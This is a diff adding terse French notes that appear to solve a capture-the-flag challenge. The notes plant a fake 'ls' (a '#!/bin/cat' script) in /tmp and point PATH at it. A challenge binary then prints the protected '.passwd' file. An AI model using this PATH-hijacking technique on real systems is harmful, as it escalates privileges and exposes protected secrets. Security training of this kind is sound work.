@@ -1,0 +1,7 @@
+cd /tmp
+mkdir moi2
+cd moi2
+vim ls (just ecrire #!/bin/cat --   (pas oublie les espace)) (sauvegarder)
+export PATH=/tmp/moi2/
+~/ch12
+cat .passwd
